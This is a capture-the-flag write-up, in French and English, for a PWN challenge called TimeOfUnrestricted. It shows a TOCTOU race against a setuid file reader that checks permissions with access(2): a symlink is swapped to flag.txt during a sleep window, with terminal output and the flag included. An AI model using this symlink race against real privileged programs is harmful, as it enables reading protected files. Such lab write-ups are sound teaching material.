# TimeOfUnrestricted
## <u>**CatÃ©gorie**</u>

PWN

## <u>**Description**</u> :

Noiche created a PoC for some file access control, and you got hired as his intern.
You are in charge of evaluating the security of his PoC, so he left a flag.txt on the disk.
Try to read the file, proving him that his PoC need some extra-work :)

FORMAT DU FLAG : flag.txt dans le docker, lisibile après exploitation du service, MCTF{...}

ACCES AU CHALLENGE :

Code source fourni + docker en remote.

## <u>Hints</u> 

ACCESS(2) Control :o

## <u>Auteur</u> 

Noiche

## <u>Solution</u> :

Il existe ici une Race Condition de type TOCTOU, en effet il se passe un certain délai entre le moment où le programme vérifie les droits d'accès au fichier et le moment où il l'ouvre pour le lire. Il est possible d'utiliser un lien symbolique pointant vers un fichier disponble à la lecture pour bypass le check de permissions, puis d'éditer le lien symbolique pour le faire pointer vers le fichier flag.txt avant l'ouverture du fichier.

Exemple :

```bash
 kali@kali  ~/Documents/SB/MCTF/PWN/chall_2  ls
flag.txt  myFile.txt  src.c  symlink  TimeOfUnrestricted  WU.md

 kali@kali  ~/Documents/SB/MCTF/PWN/chall_2  ll flag.txt TimeOfUnrestricted 
1197532 4.0K -rw------- 1 superuser kali  34 Apr  8 12:25 flag.txt
1179717  20K -rwsr-sr-x 1 superuser kali 17K Apr  8 12:33 TimeOfUnrestricted

 kali@kali  ~/Documents/SB/MCTF/PWN/chall_2  ll symlink
1179790 0 lrwxrwxrwx 1 kali kali 12 Apr  8 12:34 symlink -> ./myFile.txt

 kali@kali  ~/Documents/SB/MCTF/PWN/chall_2  ./TimeOfUnrestricted ./flag.txt 
 [...]
 [Error] File not found / Permission denied : read(./flag.txt)

 ✘ kali@kali  ~/Documents/SB/MCTF/PWN/chall_2  ./TimeOfUnrestricted ./myFile.txt 
 [...]
 [Result] Here is the content of the file ./myFile.txt : This is my file

 kali@kali  ~/Documents/SB/MCTF/PWN/chall_2  ./TimeOfUnrestricted ./symlink   
 [...]

 # Pendant l'exécution (au moment du sleep), on utilise la commande ln -sf ./flag.txt symlink
 # L'ouverture du fichier sera donc exécutée avec comme filename "./flag.txt", en bénéficiant de l'EUID
  
 [Result] Here is the content of the file ./symlink : MCTF{Sh0uld_1_ch3ck_f0r_sYml1nk?}
```

##**Flag : MCTF{Sh0uld_1_ch3ck_f0r_sYml1nk?}**
